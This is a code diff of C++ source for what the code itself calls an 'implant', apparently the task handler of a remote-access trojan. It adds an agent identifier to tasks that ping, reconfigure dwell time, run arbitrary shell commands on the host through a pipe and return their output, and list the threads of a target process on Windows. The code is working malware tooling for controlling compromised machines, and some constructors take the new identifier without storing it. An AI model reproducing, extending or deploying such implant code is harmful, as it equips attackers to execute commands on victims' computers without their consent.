@@ -31,6 +31,7 @@
     // Get the task type and identifier, declare our variables
     const auto taskType = taskTree.get_child("task_type").get_value<std::string>();
     const auto idString = taskTree.get_child("task_id").get_value<std::string>();
+    const auto agent_id = taskTree.get_child("agent_id").get_value<std::string>();
     std::stringstream idStringStream{ idString };
     boost::uuids::uuid id{};
     idStringStream >> id;
@@ -40,7 +41,8 @@
     // ===========================================================================================
     if (taskType == PingTask::key) {
         return PingTask{
-            id
+            id,
+            agent_id
         };
     }
     if (taskType == ConfigureTask::key) {
@@ -48,18 +50,21 @@
             id,
             taskTree.get_child("dwell").get_value<double>(),
             taskTree.get_child("running").get_value<bool>(),
+            agent_id,
             std::move(setter)
         };
     }
     if (taskType == ExecuteTask::key) {
         return ExecuteTask{
             id,
+            agent_id,
             taskTree.get_child("command").get_value<std::string>()
         };
     }
     if (taskType == ListThreadsTask::key) {
         return ListThreadsTask{
             id,
+            agent_id,
             taskTree.get_child("procid").get_value<std::string>()
         };
     }
@@ -73,8 +78,8 @@
 }
 
 // Instantiate the implant configuration
-Configuration::Configuration(const double meanDwell, const bool isRunning)
-    : meanDwell(meanDwell), isRunning(isRunning) {}
+Configuration::Configuration(const double meanDwell, const bool isRunning, const std::string agent_id)
+    : meanDwell(meanDwell), isRunning(isRunning), agent_id(agent_id) {}
 
 
 // Tasks
@@ -82,12 +87,12 @@ Configuration::Configuration(const double meanDwell, const bool isRunning)
 
 // PingTask
 // -------------------------------------------------------------------------------------------
-PingTask::PingTask(const boost::uuids::uuid& id)
+PingTask::PingTask(const boost::uuids::uuid& id, const std::string agent_id)
     : id{ id } {}
 
 Result PingTask::run() const {
     const auto pingResult = "PONG!";
-    return Result{ id, pingResult, true };
+    return Result{ id, agent_id, pingResult, true };
 }
 
 
@@ -96,22 +101,24 @@ Result PingTask::run() const {
 ConfigureTask::ConfigureTask(const boost::uuids::uuid& id,
     double meanDwell,
     bool isRunning,
+    std::string agent_id,
     std::function<void(const Configuration&)> setter)
     : id{ id },
     meanDwell{ meanDwell },
     isRunning{ isRunning },
+    agent_id{ agent_id },
     setter{ std::move(setter) } {}
 
 Result ConfigureTask::run() const {
     // Call setter to set the implant configuration, mean dwell time and running status
-    setter(Configuration{ meanDwell, isRunning });
-    return Result{ id, "Configuration successful!", true };
+    setter(Configuration{ meanDwell, isRunning, agent_id });
+    return Result{ id, agent_id, "Configuration successful!", true };
 }
 
 
 // ExecuteTask
 // -------------------------------------------------------------------------------------------
-ExecuteTask::ExecuteTask(const boost::uuids::uuid& id, std::string command)
+ExecuteTask::ExecuteTask(const boost::uuids::uuid& id, std::string agent_id, std::string command)
     : id{ id },
     command{ std::move(command) } {}
 
@@ -128,17 +135,17 @@ Result ExecuteTask::run() const {
         while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
             result += buffer.data();
         }
-        return Result{ id, std::move(result), true };
+        return Result{ id, agent_id, std::move(result), true };
     }
     catch (const std::exception& e) {
-        return Result{ id, e.what(), false };
+        return Result{ id, agent_id, e.what(), false };
     }
 }
 
 
 // ListThreadsTask
 // -------------------------------------------------------------------------------------------
-ListThreadsTask::ListThreadsTask(const boost::uuids::uuid& id, std::string processId)
+ListThreadsTask::ListThreadsTask(const boost::uuids::uuid& id, std::string agent_id, std::string processId)
     : id{ id },
     processId{ processId } {}
 
@@ -157,7 +164,7 @@ Result ListThreadsTask::run() const {
         }
         // Some invalid process ID was provided, throw an error
         else {
-            return Result{ id, "Error! Failed to handle given process ID.", false };
+            return Result{ id, agent_id, "Error! Failed to handle given process ID.", false };
         }
 
         HANDLE threadSnap = INVALID_HANDLE_VALUE;
@@ -166,7 +173,7 @@ Result ListThreadsTask::run() const {
         // Take a snapshot of all running threads
         threadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
         if (threadSnap == INVALID_HANDLE_VALUE)
-            return Result{ id, "Error! Could not take a snapshot of all running threads.", false };
+            return Result{ id, agent_id, "Error! Could not take a snapshot of all running threads.", false };
 
         // Fill in the size of the structure before using it. 
         te32.dwSize = sizeof(THREADENTRY32);
@@ -176,7 +183,7 @@ Result ListThreadsTask::run() const {
         if (!Thread32First(threadSnap, &te32))
         {
             CloseHandle(threadSnap);     // Must clean up the snapshot object!
-            return Result{ id, "Error! Could not retrieve information about first thread.", false };
+            return Result{ id, agent_id, "Error! Could not retrieve information about first thread.", false };
         }
 
         // Now walk the thread list of the system,
@@ -194,10 +201,10 @@ Result ListThreadsTask::run() const {
         //  Don't forget to clean up the snapshot object.
         CloseHandle(threadSnap);
         // Return string stream of thread IDs
-        return Result{ id, threadList.str(), true };
+        return Result{ id, agent_id, threadList.str(), true };
     }
     catch (const std::exception& e) {
-        return Result{ id, e.what(), false };
+        return Result{ id, agent_id, e.what(), false };
     }
 }
 
